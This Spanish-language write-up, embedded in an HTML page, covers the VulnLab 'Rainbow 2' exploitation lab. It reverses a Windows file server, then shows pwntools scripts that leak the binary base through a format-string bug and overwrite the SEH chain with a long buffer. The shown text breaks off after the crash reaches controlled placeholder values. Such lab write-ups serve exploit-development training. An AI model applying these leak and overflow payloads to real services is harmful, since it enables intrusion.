@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup VulnLab Rainbow 2</title>
+
+  <meta name="description" content="Resolución de la máquina Rainbow 2 de la plataforma de VulnLab">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup VulnLab Rainbow 2">
+  <meta name="twitter:description" content="Resolución de la máquina Rainbow 2 de la plataforma de VulnLab">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/rainbow2.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup VulnLab Rainbow 2">
+  <meta property="og:description" content="Resolución de la máquina Rainbow 2 de la plataforma de VulnLab">
+  <meta property="og:image" content="/images/otros/rainbow2.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/rainbow2.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup VulnLab Rainbow 2" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/vulnlab" title="xchg2pwn" class="blog-button">VulnLab</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">VulnLab</h4>
+    <picture><img src="/images/otros/rainbow2.png" style="float: right; margin-right:0px; margin-left:0px; height:80px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Rainbow 2</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/Rainbow 2_CTF/dev_keysvc.exe">binario</a> se nos muestra que se ha iniciado un servidor en algun puerto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\user\Desktop></span><span class="am"> .\filesrv.exe</span><span class="p">  
+Starting Rainbow2 Server...!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De primeras no conocemos el puerto que ha abierto pero con <a href="https://learn.microsoft.com/es-es/sysinternals/downloads/tcpview">TCPView</a> podemos ver que el proceso <code class="language-plaintext highlighter-rouge">filesrv.exe</code> tiene abierto el puerto <code class="language-plaintext highlighter-rouge">2121</code> en la dirección <code class="language-plaintext highlighter-rouge">0.0.0.0</code></p>
+<a href="/vulnlab/rainbow2/1.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/1.png"></p></div></a>
+
+<p class="plain-text">Al conectarnos al puerto parece que espera una entrada pero si enviamos una data por ejemplo de <code class="language-plaintext highlighter-rouge">16</code> bytes simplemente nos devuelve el mensaje <code class="language-plaintext highlighter-rouge">ERROR</code> sin más</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat</span><span class="p"> 192.168.100.5 2121  
+AAAAAAAABBBBBBBB
+ERROR</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para poder depurar el programa facilmente abriremos la aplicación dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
+<a href="/vulnlab/rainbow2/2.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/2.png"></p></div></a>
+
+<p class="plain-text">Si miramos los detalles del módulo podemos ver que contienes las protecciones <code class="language-plaintext highlighter-rouge">DEP</code> y <code class="language-plaintext highlighter-rouge">ASLR</code>, el primero impide que podamos ejecutar un shellcode en el stack, el segundo indica que la dirección base del binario deberia cambiar después de cada reinicio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona modules
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\WinDbgX\x86\mona.py modules
+
+---------- Mona command started on 2024-12-31 18:39:02 (v2.0, rev 636) ----------
+[+] Processing arguments and criteria
+    - Pointer access level : X
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+-----------------------------------------------------------------------------------------------------------------------------------------------------  
+ Module info :
+-----------------------------------------------------------------------------------------------------------------------------------------------------  
+ Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Modulename & Path
+-----------------------------------------------------------------------------------------------------------------------------------------------------  
+ 0x75de0000 | 0x76026000 | 0x00246000 | True   | False   | True  | True  |  True    | True   | [KERNELBASE.dll] (C:\Windows\SysWOW64\KERNELBASE.dll)
+ 0x732d0000 | 0x73321000 | 0x00051000 | True   | False   | True  | True  |  True    | True   | [mswsock.dll] (C:\Windows\SysWOW64\mswsock.dll)
+ 0x756b0000 | 0x757a0000 | 0x000f0000 | True   | False   | True  | True  |  True    | True   | [KERNEL32.DLL] (C:\Windows\SysWOW64\KERNEL32.DLL)
+ 0x3f290000 | 0x3f340000 | 0x000b0000 | True   | False   | True  | False |  True    | False  | [filesrv.exe] (filesrv.exe)
+ 0x775d0000 | 0x77778000 | 0x001a8000 | True   | False   | True  | True  |  True    | True   | [ntdll.dll] (ntdll.dll)
+ 0x76610000 | 0x766cb000 | 0x000bb000 | True   | False   | True  | True  |  True    | True   | [RPCRT4.dll] (C:\Windows\SysWOW64\RPCRT4.dll)
+ 0x77380000 | 0x773e5000 | 0x00065000 | True   | False   | True  | True  |  True    | True   | [WS2_32.dll] (C:\Windows\SysWOW64\WS2_32.dll)
+-----------------------------------------------------------------------------------------------------------------------------------------------------  
+
+[+] Preparing output file 'modules.txt'
+    - (Re)setting logfile C:\mona\modules.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La parte mas compleja aqui es la del reversing debido a que el programa se creó en <code class="language-plaintext highlighter-rouge">C++</code> y el tema de los objetos hace que sea más dificil leer el código, luego de renombrar algunas cosas iniciamos con la función <code class="language-plaintext highlighter-rouge">main</code>, esta inicia reservando un espacio en memoria y llamando a <code class="language-plaintext highlighter-rouge">setup</code> donde le pasa como argumento la string <code class="language-plaintext highlighter-rouge">0.0.0.0</code> y el puerto <code class="language-plaintext highlighter-rouge">2121</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">server</code> y finalmente a <code class="language-plaintext highlighter-rouge">handler</code></p>
+<a href="/vulnlab/rainbow2/3.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/3.png"></p></div></a>
+
+<p class="plain-text">La función que renombramos como <code class="language-plaintext highlighter-rouge">setmem</code> recibe un buffer y una longitud, luego llama a <code class="language-plaintext highlighter-rouge">memset</code> para llenar ese buffer con <code class="language-plaintext highlighter-rouge">0's</code> en el total de bytes del argumento</p>
+<a href="/vulnlab/rainbow2/4.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/4.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">server</code> inicia llamando a la función <code class="language-plaintext highlighter-rouge">WSAStartup</code> para inicializar winsock y luego llama a la función <code class="language-plaintext highlighter-rouge">socket</code> para crear un socket y este devuelve un descriptor</p>
+<a href="/vulnlab/rainbow2/5.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/5.png"></p></div></a>
+
+<p class="plain-text">Luego utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle formato al puerto <code class="language-plaintext highlighter-rouge">2121</code> y posteriormente llamar a <code class="language-plaintext highlighter-rouge">bind</code> y <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha de conexiones entrantes en ese puerto</p>
+<a href="/vulnlab/rainbow2/6.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/6.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">handler</code> inicia realizando un salto condicional ya que se iniciará un bucle</p>
+<a href="/vulnlab/rainbow2/7.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/7.png"></p></div></a>
+
+<p class="plain-text">En este caso se llama a la función select para verificar que los descriptores en la variable <code class="language-plaintext highlighter-rouge">readfs</code> esten listos para operaciones evitando asi errores de <code class="language-plaintext highlighter-rouge">I/O</code></p>
+<a href="/vulnlab/rainbow2/8.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/8.png"></p></div></a>
+
+<p class="plain-text">Si el valor devuelto por <code class="language-plaintext highlighter-rouge">select</code> es mayor a <code class="language-plaintext highlighter-rouge">0</code> sigue la linea roja que llama a <code class="language-plaintext highlighter-rouge">accept</code> que recibe una conexión y devuelve un nuevo descriptor en el valor de retorno</p>
+<a href="/vulnlab/rainbow2/9.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/9.png"></p></div></a>
+
+<p class="plain-text">Si se sigue la linea verde llama a <code class="language-plaintext highlighter-rouge">memset</code> para reservar un espacio en memoria y luego a <code class="language-plaintext highlighter-rouge">recv</code> para recibir un total de <code class="language-plaintext highlighter-rouge">0x1000</code> o <code class="language-plaintext highlighter-rouge">4096</code> bytes en el buffer asignado</p>
+<a href="/vulnlab/rainbow2/10.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/10.png"></p></div></a>
+
+<p class="plain-text">En la parte final se llama a la función <code class="language-plaintext highlighter-rouge">CreateThread</code> para crear un hilo por cada conexión, cada hilo ejecuta la función <code class="language-plaintext highlighter-rouge">StartAddress</code> pasandole el descriptor</p>
+<a href="/vulnlab/rainbow2/11.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/11.png"></p></div></a>
+
+<p class="plain-text">Por cada entrada recibida se llama a la función <code class="language-plaintext highlighter-rouge">menu</code> donde posiblemente se prepara la variable buffer, finalmente se llama a <code class="language-plaintext highlighter-rouge">send</code> que envia el contenido al socket</p>
+<a href="/vulnlab/rainbow2/12.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/12.png"></p></div></a>
+
+<p class="plain-text">La función menu recibe el buffer y copia a una variable <code class="language-plaintext highlighter-rouge">command</code> los primeros bytes separados por un espacio, luego copia a la variable <code class="language-plaintext highlighter-rouge">path</code> el argumento al command</p>
+<a href="/vulnlab/rainbow2/13.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/13.png"></p></div></a>
+
+<p class="plain-text">Empieza con un par de comparaciones, si la variable path es igual a <code class="language-plaintext highlighter-rouge">..</code>, <code class="language-plaintext highlighter-rouge">C:\\</code> o <code class="language-plaintext highlighter-rouge">\\</code> nos lleva a un bloque que muestra el mensaje de error <code class="language-plaintext highlighter-rouge">Fishy path</code> y retorna</p>
+<a href="/vulnlab/rainbow2/14.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/14.png"></p></div></a>
+<a href="/vulnlab/rainbow2/15.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/15.png"></p></div></a>
+
+<p class="plain-text">Podemos comprobarlo enviando como comando cualquier cosa como <code class="language-plaintext highlighter-rouge">TEST</code> y como argumento los paths restringidos, podemos ver que nos devuelve el error esperado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat</span><span class="p"> 192.168.100.5 2121  
+TEST ..
+ERROR: Fishy path
+TEST C:\
+ERROR: Fishy path
+TEST \
+ERROR: Fishy path</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Luego realiza una pequeña validación para que el programa se ejecute en el path <code class="language-plaintext highlighter-rouge">C:\shared</code>, si esta condición se cumple copia al buffer de respuesta la string <code class="language-plaintext highlighter-rouge">Path: </code> seguida del contenido que se usa como path, por la convención podemos pensar que se utiliza alguna función como <code class="language-plaintext highlighter-rouge">snprintf</code> que puede llevar a un format string</p>
+<a href="/vulnlab/rainbow2/16.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/16.png"></p></div></a>
+
+<p class="plain-text">Lo comprobamos enviando como <code class="language-plaintext highlighter-rouge">path</code> cualquier cosa como una letra <code class="language-plaintext highlighter-rouge">A</code>, en la respuesta podemos ver el mensaje <code class="language-plaintext highlighter-rouge">Path: A</code> que refleja el path de nuestra entrada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat</span><span class="p"> 192.168.100.5 2121
+TEST A
+ERROR: Can not open Path: A  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Vemos una comparación del comando con <code class="language-plaintext highlighter-rouge">LST</code> y con <code class="language-plaintext highlighter-rouge">GET</code>, debido a las validaciones de path podemos suponer que <code class="language-plaintext highlighter-rouge">LST</code> actúa como un <code class="language-plaintext highlighter-rouge">dir</code> y <code class="language-plaintext highlighter-rouge">GET</code> como un <code class="language-plaintext highlighter-rouge">type</code></p>
+<a href="/vulnlab/rainbow2/17.png" target="_blank"><div><p><img src="/vulnlab/rainbow2/17.png"></p></div></a>
+
+<p class="plain-text">Las restricciones no comparan la ruta <code class="language-plaintext highlighter-rouge">/</code>, asi que podemos usar <code class="language-plaintext highlighter-rouge">LST</code> para listar archivos desde la raíz, aunque esta no es la vulnerabilidad que debemos seguir</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">LST /
+Path: /
+C:\Documents and Settings
+C:\PerfLogs
+C:\Program Files
+C:\Program Files (x86)
+C:\ProgramData
+C:\Recovery
+C:\System Volume Information  
+C:\Users
+C:\Windows</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">También podemos usar un simple <code class="language-plaintext highlighter-rouge">.</code> para ver los archivos en el directorio actual, al parecer si le pasamos un archivo al comando <code class="language-plaintext highlighter-rouge">GET</code> devuelve el contenido en base64</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">LST .
+Path: .
+C:\shared\filesrv.exe  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">GET filesrv.exe
+Path: filesrv.exe
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQokAAAAAAAAAJsIVFjfaToL32k6C99pOgsMGzkK0mk6CwwbPwpqaToLDBs+CslpOguNHD4KzWk6C40cOQrLaToLjRw/CpJpOgsMGzsK2mk6C99pOwuhaToLHhw/CtxpOgseHMUL3mk6Cx4cOAreaToLUmljaN9pOgsAAAAAAAAAAFBFAABMAQUAGJqcYgAAAAAAAAAA4AACAQsBDh0A8AgAAOYBAAAAAAA5EAMAABAAAAAACQAAABBAABAAAAACAAAGAAAAAAAAAAYAAAAAAAAAAAALAAAEAAAAAAAAAwBAgQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA/FMKADwAAAAAoAoA4AEAAAAAAAAAAAAAAAAAAAAAAAAAsAoAqE4AAIzZCQBUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4NkJAEAAAAAAAAAAAAAAAAAACQAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAACj7ggAABAAAADwCAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAA6F4BAAAACQAAYAEAAPQIAAAAAAAAAAAAAAAAAEAAAEAuZGF0YQAAACwzAAAAYAoAAB4AAABUCgAAAAAAAAAAAAAAAABAAADALnJzcmMAAADgAQAAAKAKAAACAAAAcgoAAAAAAAAAAAAAAAAAQAAAQC5yZWxvYwAAqE4AAACwCgAAUAAAAHQKAAAAAAAAAAAAAAAAAEAAAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVYvsagC5SHw=  </span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Sabemos que el path se refleja en la respuesta y probablemente ocasione una vulnerabilidad de format string, enviaremos varias <code class="language-plaintext highlighter-rouge">%p</code> separados por un <code class="language-plaintext highlighter-rouge">.</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 2121  
+TEST %p.%p</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando llegamos al breakpoint en la llamada a la función <code class="language-plaintext highlighter-rouge">send</code> que envia el buffer vemos que en lugar de los <code class="language-plaintext highlighter-rouge">%p</code> se reflejan algunos punteros bastante interesantes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> bp filesrv + 0x11e13
+
+</span><span class="ro">0:000></span><span class="p"> g
+Breakpoint 0 hit
+eax=00000128 ebx=010fe894 ecx=010ff9b8 edx=013c25b0 esi=3f2a4120 edi=3f2a4120  
+eip=3f2a1e13 esp=017af704 ebp=017af834 iopl=0         nv up ei pl nz na po nc  
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
+filesrv+0x11e13:
+3f2a1e13 e8982a0000      call    filesrv+0x148b0 (3f2a48b0)
+
+</span><span class="ro">0:000></span><span class="p"> db poi(esp + 4)
+013c25b0  45 52 52 4f 52 3a 20 43-61 6e 20 6e 6f 74 20 6f  ERROR: Can not o
+013c25c0  70 65 6e 20 50 61 74 68-3a 20 31 44 45 37 30 30  pen Path: 1DE700
+013c25d0  34 46 2e 33 46 32 41 34-31 32 30 0a 0a 00 ad ba  4F.3F2A4120.....
+013c25e0  ab ab ab ab ab ab ab ab-00 00 00 00 00 00 00 00  ................
+013c25f0  10 e4 fb a2 f4 5e 00 00-c0 00 3b 01 c0 24 3c 01  .....^....;..$&lt.
+013c2600  ee fe ee fe ee fe ee fe-ee fe ee fe ee fe ee fe  ................
+013c2610  ee fe ee fe ee fe ee fe-ee fe ee fe ee fe ee fe  ................
+013c2620  ee fe ee fe ee fe ee fe-ee fe ee fe ee fe ee fe  ................</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El segundo puntero apunta a una dirección estática en el binario, podemos restarle la dirección base del binario desde el debugger y obtener el offset que es <code class="language-plaintext highlighter-rouge">0x14120</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000> </span><span class="p">lm m filesrv
+Browse full module list
+start    end        module name
+3f290000 3f340000   filesrv  C (no symbols)  
+
+</span><span class="ro">0:000></span><span class="p"> ? 0x3f2a4120 - 0x3f290000
+Evaluate expression: 82208 = 00014120</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Automatizamos este proceso en un script de python, enviamos los <code class="language-plaintext highlighter-rouge">%p</code> que nos muestra el leak y al restar el offset calculado muestra la dirección base del binario</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, log
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+log.info(</span><span class="no">f</span><span class="s">"Binary base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 2121: Done  
+[</span><span class="az">*</span><span class="p">] Binary base: 0x3f290000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La entrada en realidad tampoco parece estar muy bien sanitizada, asi que enviamos una cantidad alta de bytes de <code class="language-plaintext highlighter-rouge">cyclic</code> en busca de algún tipo de desbordamiento</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, cyclic
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)  
+
+payload</span><span class="o"> =</span><span class="p"> cyclic(</span><span class="mi">4000</span><span class="p">)
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><span class="o"> +</span><span class="p"> payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar el exploit el programa corrompe sin embargo el <code class="language-plaintext highlighter-rouge">eip</code> no apunta a ninguna parte de la cadena, aunque no sobrescribimos un return address si sobrescribimos la estructura <code class="language-plaintext highlighter-rouge">SEH</code> por lo que sobrescribimos ambos valores de la estructura</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(11c4.f6c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=010b0000 ebx=00007878 ecx=010af0dc edx=00000000 esi=010af0f0 edi=010af538
+eip=3f2de8ea esp=010af0b4 ebp=010af0c4 iopl=0         nv up ei pl nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010207
+filesrv+0x4e8ea:
+3f2de8ea 8838            mov     byte ptr [eax],bh          ds:002b:010b0000=??  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+010afca4: 6b61616a
+Invalid exception stack at 6b616169</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Le pasamos el valor a <code class="language-plaintext highlighter-rouge">cyclic</code> que nos dice que offset para sobrescribir el puntero al siguiente <code class="language-plaintext highlighter-rouge">SEH</code> es de <code class="language-plaintext highlighter-rouge">1032</code> bytes, y para sobrescribir el <code class="language-plaintext highlighter-rouge">SEH</code> handler <code class="language-plaintext highlighter-rouge">1036</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cyclic </span><span class="p">-l 0x6b616169  
+1032
+
+</span><span class="ve">❯ cyclic</span><span class="p"> -l 0x6b61616a  
+1036</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro payload ahora envia <code class="language-plaintext highlighter-rouge">1032 A's</code> hasta antes de sobrescribir la estructura SEH, <code class="language-plaintext highlighter-rouge">4 B's</code> que serán el siguiente SEH y <code class="language-plaintext highlighter-rouge">4 C's</code> que serán el controlador, ademas de ello rellenamos con <code class="language-plaintext highlighter-rouge">D's</code> hasta llegar a <code class="language-plaintext highlighter-rouge">4000</code> bytes para mantener el exploit estable forzando que ocurra la excepción enviando una cantidad muy grande de bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 2121</span><span class="p">)
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST %p.%p"</span><span class="p">)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+binary_base</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip(), </span><span class="mi">16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x14120</span><span class="p">  
+
+offset</span><span class="o"> =</span><span class="mi"> 1032</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+nseh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+seh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">4000</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+shell.sendline(</span><span class="no">b</span><span class="s">"TEST "</span><span class="o"> +</span><span class="p"> payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar el exploit el programa corrompe pero ahora controlamos la estructura SEH con el siguiente SEH con el valor <code class="language-plaintext highlighter-rouge">0x42424242</code> y el controlador con <code class="language-plaintext highlighter-rouge">0x43434343</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(11c4.f6c): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=01510000 ebx=00004444 ecx=0150f1dc edx=00000000 esi=0150f1f0 edi=0150f638
